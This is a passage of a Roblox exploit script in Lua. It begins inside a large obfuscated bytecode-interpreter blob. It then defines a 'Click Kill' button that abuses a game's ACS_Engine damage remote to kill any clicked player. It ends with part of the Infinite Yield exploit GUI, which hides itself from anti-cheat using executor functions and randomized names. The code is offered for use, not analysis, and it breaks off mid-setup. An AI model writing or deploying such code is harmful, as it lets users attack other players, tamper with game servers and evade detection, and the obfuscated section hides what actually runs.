lIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("MZ8")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("78")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("GH8")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("J8WP")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GY")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("DCM")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cIf")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("be0H")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jg")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4jO")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("fRSp")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("I8")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZBI")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("H0ol")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uC")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("G0N")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("fHcH")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BD")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("buc")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("o9")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("i1V")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{684;980;668;221};{19;142;308;965};"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("JT")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gJ")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{998;413;434;821};"1 + 1 = 111";{754;155;987;120};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ih")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("GyZ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mm")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("RNK")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("v1")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("LgP")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("omRc")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("HN")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rN2")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("yiIy")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Vn")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("3KW")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{26;795;640;933};{81;121;891;744};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8d")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("zYj")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vn0X")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("QD")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wds")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4K")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("OI8")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZQoy")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fS")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("PAZ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("96")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("bZR")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{366;106;336;357};"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("V5l")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("RA")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{717;93;793;462};}]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Vu")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("N0m")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("c5pM")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Q9")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("WOT")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("san4")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Y3")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nOb")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oE")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ujD")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("39PD")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("VL")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("RA")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("XUN")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{140;135;573;457};"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{404;345;303;381};"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Nh")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Mh8")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ev")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("sAW")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1Y")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("vUE")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yr1i")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("he")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{914;590;66;526};"1 + 1 = 111";{297;347;881;224};}]];end;btwbaby_llIIllIll=btwbaby_llIIllIll+1;end;end);end;return btwbaby_IIllIIIIlI(true,{},btwbaby_IlllIIlIIllll())();end)(string.byte,table.insert,setmetatable);
end)

ClickKill.Name = "ClickKill"
ClickKill.Parent = MAINGUI
ClickKill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ClickKill.Position = UDim2.new(0.71428138, 0, 0.713043451, 0)
ClickKill.Size = UDim2.new(0, 113, 0, 42)
ClickKill.Font = Enum.Font.SourceSans
ClickKill.Text = "Click Kill"
ClickKill.TextColor3 = Color3.fromRGB(0, 0, 0)
ClickKill.TextSize = 20.000
ClickKill.MouseButton1Down:connect(function()
	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	mouse.Button1Down:connect(function()
		local mT = mouse.Target
		local dead = mT.Parent
		local damage = 100
		print(mT)
		if dead.ClassName == "Model" then
			local tbl_main =
				{
					game:GetService("Workspace")[dead.Name].Humanoid,
					damage,
					0,
					0
				}
			game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage:FireServer(unpack(tbl_main))
		else
			if mT.Name == "Handle" then
				local tbl_main =
					{
						game:GetService("Workspace")[dead.Parent.Name].Humanoid,
						damage,
						0,
						0
					}
				game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage:FireServer(unpack(tbl_main))
			end
		end
	end)
end)

InfiniteYield.Name = "InfiniteYield"
InfiniteYield.Parent = MAINGUI
InfiniteYield.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfiniteYield.Position = UDim2.new(0.367058814, 0, 0.713043451, 0)
InfiniteYield.Size = UDim2.new(0, 113, 0, 42)
InfiniteYield.Font = Enum.Font.SourceSans
InfiniteYield.Text = "InfiniteYield"
InfiniteYield.TextColor3 = Color3.fromRGB(0, 0, 0)
InfiniteYield.TextSize = 20.000
InfiniteYield.MouseButton1Down:connect(function()
	if IY_LOADED and not _G.IY_DEBUG == true then
		error("Infinite Yield is already running!",0)
		return
	end

	pcall(function() getgenv().IY_LOADED  = true end)

	if not game:IsLoaded() then
		local notLoaded = Instance.new("Message",workspace)
		notLoaded.Text = 'Infinite Yield is waiting for the game to load'
		game.Loaded:Wait()
		notLoaded:Destroy()
	end

	ver = '5.2'

	Players = game:GetService("Players")

	Holder = Instance.new("Frame")
	Title = Instance.new("TextLabel")
	Dark = Instance.new("Frame")
	Cmdbar = Instance.new("TextBox")
	CMDsF = Instance.new("ScrollingFrame")
	cmdListLayout = Instance.new("UIListLayout")
	SettingsButton = Instance.new("ImageButton")
	ColorsButton = Instance.new("ImageButton")
	Settings = Instance.new("Frame")
	Prefix = Instance.new("TextLabel")
	PrefixBox = Instance.new("TextBox")
	Keybinds = Instance.new("TextLabel")
	StayOpen = Instance.new("TextLabel")
	Button = Instance.new("Frame")
	On = Instance.new("TextButton")
	Positions = Instance.new("TextLabel")
	EventBind = Instance.new("TextLabel")
	Plugins = Instance.new("TextLabel")
	Example = Instance.new("TextButton")
	Notification = Instance.new("Frame")
	Title_2 = Instance.new("TextLabel")
	Text_2 = Instance.new("TextLabel")
	CloseButton = Instance.new("TextButton")
	CloseImage = Instance.new("ImageLabel")
	PinButton = Instance.new("TextButton")
	PinImage = Instance.new("ImageLabel")
	Tooltip = Instance.new("Frame")
	Title_3 = Instance.new("TextLabel")
	Description = Instance.new("TextLabel")
	IntroBackground = Instance.new("Frame")
	Logo = Instance.new("ImageLabel")
	Credits = Instance.new("TextBox")
	KeybindsFrame = Instance.new("Frame")
	Close = Instance.new("TextButton")
	Add = Instance.new("TextButton")
	Delete = Instance.new("TextButton")
	Holder_2 = Instance.new("ScrollingFrame")
	Example_2 = Instance.new("Frame")
	Text_3 = Instance.new("TextLabel")
	Delete_2 = Instance.new("TextButton")
	KeybindEditor = Instance.new("Frame")
	background_2 = Instance.new("Frame")
	Dark_4 = Instance.new("Frame")
	Directions = Instance.new("TextLabel")
	BindTo = Instance.new("TextButton")
	Add_2 = Instance.new("TextButton")
	Cmdbar_2 = Instance.new("TextBox")
	Toggles = Instance.new("ScrollingFrame")
	Fly = Instance.new("TextLabel")
	Select_3 = Instance.new("TextButton")
	Noclip = Instance.new("TextLabel")
	Select_4 = Instance.new("TextButton")
	Float = Instance.new("TextLabel")
	Select_5 = Instance.new("TextButton")
	ClickTP = Instance.new("TextLabel")
	Select_6 = Instance.new("TextButton")
	ClickDelete = Instance.new("TextLabel")
	Select_13 = Instance.new("TextButton") 
	Xray = Instance.new("TextLabel")
	Select_10 = Instance.new("TextButton")
	Swim = Instance.new("TextLabel")
	Select_11 = Instance.new("TextButton")
	Fling = Instance.new("TextLabel")
	Select_12 = Instance.new("TextButton")
	Invisible = Instance.new("TextLabel")
	Select_14 = Instance.new("TextButton")
	Vehiclefly = Instance.new("TextLabel")
	Select_15 = Instance.new("TextButton")
	VehicleNoclip = Instance.new("TextLabel")
	Select_16 = Instance.new("TextButton")
	shadow_2 = Instance.new("Frame")
	PopupText_2 = Instance.new("TextLabel")
	Exit_2 = Instance.new("TextButton")
	ExitImage_2 = Instance.new("ImageLabel")
	PositionsFrame = Instance.new("Frame")
	Close_3 = Instance.new("TextButton")
	Delete_5 = Instance.new("TextButton")
	Part = Instance.new("TextButton")
	Holder_4 = Instance.new("ScrollingFrame")
	Example_4 = Instance.new("Frame")
	Text_5 = Instance.new("TextLabel")
	Delete_6 = Instance.new("TextButton")
	TP = Instance.new("TextButton")
	AliasesFrame = Instance.new("Frame")
	Close_2 = Instance.new("TextButton")
	Delete_3 = Instance.new("TextButton")
	Holder_3 = Instance.new("ScrollingFrame")
	Example_3 = Instance.new("Frame")
	Text_4 = Instance.new("TextLabel")
	Delete_4 = Instance.new("TextButton")
	Aliases = Instance.new("TextLabel")
	PluginsFrame = Instance.new("Frame")
	Close_4 = Instance.new("TextButton")
	Add_3 = Instance.new("TextButton")
	Holder_5 = Instance.new("ScrollingFrame")
	Example_5 = Instance.new("Frame")
	Text_6 = Instance.new("TextLabel")
	Delete_7 = Instance.new("TextButton")
	PluginEditor = Instance.new("Frame")
	background_3 = Instance.new("Frame")
	Dark_9 = Instance.new("Frame")
	Img = Instance.new("ImageButton")
	AddPlugin = Instance.new("TextButton")
	FileName = Instance.new("TextBox")
	About = Instance.new("TextLabel")
	Directions_2 = Instance.new("TextLabel")
	shadow_3 = Instance.new("Frame")
	PopupText_3 = Instance.new("TextLabel")
	Exit_3 = Instance.new("TextButton")
	ExitImage_3 = Instance.new("ImageLabel")
	AliasHint = Instance.new("TextLabel")
	PluginsHint = Instance.new("TextLabel")
	PositionsHint = Instance.new("TextLabel")
	ToPartFrame = Instance.new("Frame")
	background_5 = Instance.new("Frame")
	ChoosePart = Instance.new("TextButton")
	CopyPath = Instance.new("TextButton")
	Directions_4 = Instance.new("TextLabel")
	Path = Instance.new("TextLabel")
	shadow_4 = Instance.new("Frame")
	PopupText_5 = Instance.new("TextLabel")
	Exit_4 = Instance.new("TextButton")
	ExitImage_5 = Instance.new("ImageLabel")
	logs = Instance.new("Frame")
	shadow = Instance.new("Frame")
	Hide = Instance.new("TextButton")
	ImageLabel = Instance.new("ImageLabel")
	PopupText = Instance.new("TextLabel")
	Exit = Instance.new("TextButton")
	ImageLabel_2 = Instance.new("ImageLabel")
	background = Instance.new("Frame")
	chat = Instance.new("Frame")
	Clear = Instance.new("TextButton")
	SaveChatlogs = Instance.new("TextButton")
	Toggle = Instance.new("TextButton")
	scroll_2 = Instance.new("ScrollingFrame")
	join = Instance.new("Frame")
	Toggle_2 = Instance.new("TextButton")
	Clear_2 = Instance.new("TextButton")
	scroll_3 = Instance.new("ScrollingFrame")
	listlayout = Instance.new("UIListLayout",scroll_3)
	selectChat = Instance.new("TextButton")
	selectJoin = Instance.new("TextButton")

	function randomString()
		local length = math.random(10,20)
		local array = {}
		for i = 1, length do
			array[i] = string.char(math.random(32, 126))
		end
		return table.concat(array)
	end

	COREGUI = game:GetService("CoreGui")
	PARENT = nil
	if (not is_sirhurt_closure) and (syn and syn.protect_gui) then --sirhurt is retarded
		local Main = Instance.new("ScreenGui")
		Main.Name = randomString()
		syn.protect_gui(Main)
		Main.Parent = COREGUI
		PARENT = Main
	elseif get_hidden_gui or gethui then
		local hiddenUI = get_hidden_gui or gethui
		local Main = Instance.new("ScreenGui")
		Main.Name = randomString()
		Main.Parent = hiddenUI()
		PARENT = Main
	elseif COREGUI:FindFirstChild('RobloxGui') then
		PARENT = COREGUI.RobloxGui
	else
		local Main = Instance.new("ScreenGui")
		Main.Name = randomString()
		Main.Parent = COREGUI
		PARENT = Main
	end

	shade1 = {}
	shade2 = {}
	shade3 = {}
	text1 = {}
	text2 = {}
	scroll = {}

	Holder.Name = randomString()
	Holder.Parent = PARENT
	Holder.Active = true
	Holder.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Holder.BorderSizePixel = 0
	Holder.Position = UDim2.new(1, -250, 1, -220)
	Holder.Size = UDim2.new(0, 250, 0, 220)
	Holder.ZIndex = 10
	table.insert(shade2,Holder)

	Title.Name = "Title"
	Title.Parent = Holder
	Title.Active = true
	Title.BackgroundColor3 = Color3.fromRGB(36,36,37)
	Title.BorderSizePixel = 0
	Title.Size = UDim2.new(0, 250, 0, 20)
	Title.Font = Enum.Font.SourceSans
	Title.TextSize = 18
	Title.Text = "Infinite Yield FE v"..ver
	Title.TextColor3 = Color3.new(1, 1, 1)
	Title.ZIndex = 10
	table.insert(shade1,Title)
	table.insert(text1,Title)

	Dark.Name = "Dark"
	Dark.Parent = Holder
	Dark.Active = true
	Dark.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Dark.BorderSizePixel = 0
	Dark.Position = UDim2.new(0, 0, 0, 45)
	Dark.Size = UDim2.new(0, 250, 0, 175)
	Dark.ZIndex = 10
	table.insert(shade1,Dark)

	Cmdbar.Name = "Cmdbar"
	Cmdbar.Parent = Holder
	Cmdbar.BackgroundTransparency = 1
	Cmdbar.BorderSizePixel = 0
	Cmdbar.Position = UDim2.new(0, 5, 0, 20)
	Cmdbar.Size = UDim2.new(0, 240, 0, 25)
	Cmdbar.Font = Enum.Font.SourceSans
	Cmdbar.TextSize = 18
	Cmdbar.TextXAlignment = Enum.TextXAlignment.Left
	Cmdbar.TextColor3 = Color3.new(1, 1, 1)
	Cmdbar.Text = ""
	Cmdbar.ZIndex = 10
	Cmdbar.PlaceholderText = "Command Bar"

	CMDsF.Name = "CMDs"
	CMDsF.Parent = Holder
	CMDsF.BackgroundTransparency = 1
	CMDsF.BorderSizePixel = 0
	CMDsF.Position = UDim2.new(0, 5, 0, 45)
	CMDsF.Size = UDim2.new(0, 245, 0, 175)
	CMDsF.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	CMDsF.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	CMDsF.CanvasSize = UDim2.new(0, 0, 0, 0)
	CMDsF.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	CMDsF.ScrollBarThickness = 8
	CMDsF.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	CMDsF.VerticalScrollBarInset = 'Always'
	CMDsF.ZIndex = 10
	table.insert(scroll,CMDsF)

	cmdListLayout.Parent = CMDsF

	SettingsButton.Name = "SettingsButton"
	SettingsButton.Parent = Holder
	SettingsButton.BackgroundTransparency = 1
	SettingsButton.Position = UDim2.new(0, 230, 0, 0)
	SettingsButton.Size = UDim2.new(0, 20, 0, 20)
	SettingsButton.Image = "rbxassetid://1204397029"
	SettingsButton.ZIndex = 10

	ReferenceButton = Instance.new("ImageButton")
	ReferenceButton.Name = "ReferenceButton"
	ReferenceButton.Parent = Holder
	ReferenceButton.BackgroundTransparency = 1
	ReferenceButton.Position = UDim2.new(0, 212, 0, 2)
	ReferenceButton.Size = UDim2.new(0, 16, 0, 16)
	ReferenceButton.Image = "rbxassetid://3523243755"
	ReferenceButton.ZIndex = 10

	Settings.Name = "Settings"
	Settings.Parent = Holder
	Settings.Active = true
	Settings.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Settings.BorderSizePixel = 0
	Settings.Position = UDim2.new(0, 0, 0, 220)
	Settings.Size = UDim2.new(0, 250, 0, 175)
	Settings.ZIndex = 10
	table.insert(shade1,Settings)

	SettingsHolder = Instance.new("ScrollingFrame")
	SettingsHolder.Name = "Holder"
	SettingsHolder.Parent = Settings
	SettingsHolder.BackgroundTransparency = 1
	SettingsHolder.BorderSizePixel = 0
	SettingsHolder.Size = UDim2.new(1,0,1,0)
	SettingsHolder.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	SettingsHolder.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	SettingsHolder.CanvasSize = UDim2.new(0, 0, 0, 235)
	SettingsHolder.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	SettingsHolder.ScrollBarThickness = 8
	SettingsHolder.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	SettingsHolder.VerticalScrollBarInset = 'Always'
	SettingsHolder.ZIndex = 10
	table.insert(scroll,SettingsHolder)

	Prefix.Name = "Prefix"
	Prefix.Parent = SettingsHolder
	Prefix.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Prefix.BorderSizePixel = 0
	Prefix.BackgroundTransparency = 1
	Prefix.Position = UDim2.new(0, 5, 0, 5)
	Prefix.Size = UDim2.new(1, -10, 0, 20)
	Prefix.Font = Enum.Font.SourceSans
	Prefix.TextSize = 14
	Prefix.Text = "Prefix"
	Prefix.TextColor3 = Color3.new(1, 1, 1)
	Prefix.TextXAlignment = Enum.TextXAlignment.Left
	Prefix.ZIndex = 10
	table.insert(shade2,Prefix)
	table.insert(text1,Prefix)

	PrefixBox.Name = "PrefixBox"
	PrefixBox.Parent = Prefix
	PrefixBox.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	PrefixBox.BorderSizePixel = 0
	PrefixBox.Position = UDim2.new(1, -20, 0, 0)
	PrefixBox.Size = UDim2.new(0, 20, 0, 20)
	PrefixBox.Font = Enum.Font.SourceSansBold
	PrefixBox.TextSize = 14
	PrefixBox.Text = ''
	PrefixBox.TextColor3 = Color3.new(0, 0, 0)
	PrefixBox.ZIndex = 10
	table.insert(shade3,PrefixBox)
	table.insert(text2,PrefixBox)

	function makeSettingsButton(name,iconID,off)
		local button = Instance.new("TextButton")
		button.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		button.BorderSizePixel = 0
		button.Position = UDim2.new(0,0,0,0)
		button.Size = UDim2.new(1,0,0,25)
		button.Text = ""
		button.ZIndex = 10
		local icon = Instance.new("ImageLabel")
		icon.Name = "Icon"
		icon.Parent = button
		icon.Position = UDim2.new(0,5,0,5)
		icon.Size = UDim2.new(0,16,0,16)
		icon.BackgroundTransparency = 1
		icon.Image = iconID
		icon.ZIndex = 10
		if off then
			icon.ScaleType = Enum.ScaleType.Crop
			icon.ImageRectSize = Vector2.new(16,16)
			icon.ImageRectOffset = Vector2.new(off,0)
		end
		local label = Instance.new("TextLabel")
		label.Name = "ButtonLabel"
		label.Parent = button
		label.BackgroundTransparency = 1
		label.Text = name
		label.Position = UDim2.new(0,28,0,0)
		label.Size = UDim2.new(1,-28,1,0)
		label.Font = Enum.Font.SourceSans
		label.TextColor3 = Color3.new(1, 1, 1)
		label.TextSize = 14
		label.ZIndex = 10
		label.TextXAlignment = Enum.TextXAlignment.Left
		table.insert(shade2,button)
		table.insert(text1,label)
		return button
	end

	ColorsButton = makeSettingsButton("Edit Theme","rbxassetid://4911962991")
	ColorsButton.Position = UDim2.new(0,5,0,55)
	ColorsButton.Size = UDim2.new(1,-10,0,25)
	ColorsButton.Name = "Colors"
	ColorsButton.Parent = SettingsHolder

	Keybinds = makeSettingsButton("Edit Keybinds","rbxassetid://129697930")
	Keybinds.Position = UDim2.new(0, 5, 0, 85)
	Keybinds.Size = UDim2.new(1, -10, 0, 25)
	Keybinds.Name = "Keybinds"
	Keybinds.Parent = SettingsHolder

